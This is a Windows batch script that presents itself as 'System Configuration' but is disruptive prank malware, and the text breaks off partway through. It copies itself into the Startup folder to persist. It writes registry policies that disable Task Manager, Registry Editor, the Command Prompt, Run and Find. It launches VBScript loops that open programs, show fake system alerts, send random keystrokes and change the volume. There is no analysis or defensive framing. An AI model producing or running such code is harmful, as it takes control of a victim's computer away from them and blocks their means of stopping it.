@echo off
title System Configuration
color 0a
echo Initializing settings...
timeout /t 2 >nul
REM Add to startup for persistence
copy "%~f0" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" >nul
REM Task, Registry Editor, and Command Prompt
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f >nul
REM Block Ctrl+Alt+Delete options
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f >nul
REM Create a VBScript to handle keyboard remapping
echo Set objShell = CreateObject("WScript.Shell") > "%temp%\keyremap.vbs"
echo Set oWS = WScript.CreateObject("WScript.Shell") >> "%temp%\keyremap.vbs"
echo strDesktop = oWS.SpecialFolders("Desktop") >> "%temp%\keyremap.vbs"
echo. >> "%temp%\keyremap.vbs"
echo Do While True >> "%temp%\keyremap.vbs"
echo     Randomize >> "%temp%\keyremap.vbs"
echo     action = Int((10 * Rnd) + 1) >> "%temp%\keyremap.vbs"
echo     Select Case action >> "%temp%\keyremap.vbs"
echo         Case 1: objShell.Run "explorer.exe" >> "%temp%\keyremap.vbs"
echo         Case 2: objShell.Run "notepad.exe" >> "%temp%\keyremap.vbs"
echo         Case 3: objShell.Run "calc.exe" >> "%temp%\keyremap.vbs"
echo         Case 4: objShell.Run "mspaint.exe" >> "%temp%\keyremap.vbs"
echo         Case 5: objShell.Run "control.exe" >> "%temp%\keyremap.vbs"
echo         Case 6: objShell.Run "cmd.exe" >> "%temp%\keyremap.vbs"
echo         Case 7: objShell.Run "charmap.exe" >> "%temp%\keyremap.vbs"
echo         Case 8: objShell.Run "osk.exe" >> "%temp%\keyremap.vbs"
echo         Case 9: objShell.Run "dxdiag.exe" >> "%temp%\keyremap.vbs"
echo         Case 10: objShell.Run "taskmgr.exe" >> "%temp%\keyremap.vbs"
echo     End Select >> "%temp%\keyremap.vbs"
echo     WScript.Sleep 2000 >> "%temp%\keyremap.vbs"
echo Loop >> "%temp%\keyremap.vbs"
REM Start the key remapper
start /b wscript.exe "%temp%\keyremap.vbs"
REM Create annoying popups
echo Set objShell = CreateObject("WScript.Shell") > "%temp%\popup.vbs"
echo Do While True >> "%temp%\popup.vbs"
echo     Randomize >> "%temp%\popup.vbs"
echo     message = Int((5 * Rnd) + 1) >> "%temp%\popup.vbs"
echo     Select Case message >> "%temp%\popup.vbs"
echo         Case 1: objShell.Popup "Keyboard configuration updated", 3, "System Alert", 64 >> "%temp%\popup.vbs"
echo         Case 2: objShell.Popup "Input devices remapped", 3, "Hardware Notice", 48 >> "%temp%\popup.vbs"
echo         Case 3: objShell.Popup "System optimization complete", 3, "Windows", 64 >> "%temp%\popup.vbs"
echo         Case 4: objShell.Popup "Your keyboard is now a mystery", 3, "Fun Time", 32 >> "%temp%\popup.vbs"
echo         Case 5: objShell.Popup "Enjoy the chaos!", 3, "Prank Active", 64 >> "%temp%\popup.vbs"
echo     End Select >> "%temp%\popup.vbs"
echo     WScript.Sleep 5000 >> "%temp%\popup.vbs"
echo Loop >> "%temp%\popup.vbs"
REM Start the popup script
start /b wscript.exe "%temp%\popup.vbs"
REM Create keyboard chaos script
echo Set objShell = CreateObject("WScript.Shell") > "%temp%\chaos.vbs"
echo Do While True >> "%temp%\chaos.vbs"
echo     Randomize >> "%temp%\chaos.vbs"
echo     chaos = Int((8 * Rnd) + 1) >> "%temp%\chaos.vbs"
echo     Select Case chaos >> "%temp%\chaos.vbs"
echo         Case 1: objShell.SendKeys "{NUMLOCK}" >> "%temp%\chaos.vbs"
echo         Case 2: objShell.SendKeys "{CAPSLOCK}" >> "%temp%\chaos.vbs"
echo         Case 3: objShell.SendKeys "{SCROLLLOCK}" >> "%temp%\chaos.vbs"
echo         Case 4: objShell.SendKeys "^{ESC}" >> "%temp%\chaos.vbs"
echo         Case 5: objShell.SendKeys "{F1}" >> "%temp%\chaos.vbs"
echo         Case 6: objShell.SendKeys "{F11}" >> "%temp%\chaos.vbs"
echo         Case 7: objShell.SendKeys "%{TAB}" >> "%temp%\chaos.vbs"
echo         Case 8: objShell.SendKeys "^{ESC}" >> "%temp%\chaos.vbs"
echo     End Select >> "%temp%\chaos.vbs"
echo     WScript.Sleep 3000 >> "%temp%\chaos.vbs"
echo Loop >> "%temp%\chaos.vbs"

REM Start the chaos script
start /b wscript.exe "%temp%\chaos.vbs"

REM Create volume control chaos
echo Set objShell = CreateObject("WScript.Shell") > "%temp%\volume.vbs"
echo Do While True >> "%temp%\volume.vbs"
echo     Randomize >> "%temp%\volume.vbs"
echo     vol = Int((3 * Rnd) + 1) >> "%temp%\volume.vbs"
echo     Select Case vol >> "%temp%\volume.vbs"
echo         Case 1: objShell.SendKeys "{VOLUME_UP}" >> "%temp%\volume.vbs"
echo         Case 2: objShell.SendKeys "{VOLUME_DOWN}" >> "%temp%\volume.vbs"
echo         Case 3: objShell.SendKeys "{VOLUME_MUTE}" >> "%temp%\volume.vbs"
echo     End Select >> "%temp%\volume.vbs"
echo     WScript.Sleep 4000 >> "%temp%\volume.vbs"
echo Loop >> "%temp%\volume.vbs"

REM Start the volume script
start /b wscript.exe "%temp%\volume.vbs"

REM Create mouse chaos
echo Set objShell = CreateObject("WScript.Shell") > "%temp%\mouse.vbs"
echo Do While True >> "%temp%\mouse.vbs"
echo     Randomize >> "%temp%\mouse.vbs"
echo     mouse = Int((4 * Rnd) + 1) >> "%temp%\mouse.vbs"
echo     Select Case mouse >> "%temp%\mouse.vbs"
echo         Case 1: objShell.SendKeys "{RIGHT}" >> "%temp%\mouse.vbs"
echo         Case 2: objShell.SendKeys "{LEFT}" >> "%temp%\mouse.vbs"
echo         Case 3: objShell.SendKeys "{UP}" >> "%temp%\mouse.vbs"
echo         Case 4: objShell.SendKeys "{DOWN}" >> "%temp%\mouse.vbs"
echo     End Select >> "%temp%\mouse.vbs"
echo     WScript.Sleep 2000 >> "%temp%\mouse.vbs"
echo Loop >> "%temp%\mouse.vbs"

REM Start the mouse script
start /b wscript.exe "%temp%\mouse.vbs"

REM Open random browsers
echo Set objShell = CreateObject("WScript.Shell") > "%temp%\browser.vbs"
echo Do While True >> "%temp%\browser.vbs"
echo     Randomize >> "%temp%\browser.vbs"
echo     site = Int((5 * Rnd) + 1) >> "%temp%\browser.vbs"
echo     Select Case site >> "%temp%\browser.vbs"
echo         Case 1: objShell.Run "https://www.google.com" >> "%temp%\browser.vbs"
echo         Case 2: objShell.Run "https://www.youtube.com" >> "%temp%\browser.vbs"
echo         Case 3: objShell.Run "https://www.reddit.com" >> "%temp%\browser.vbs"
echo         Case 4: objShell.Run "https://www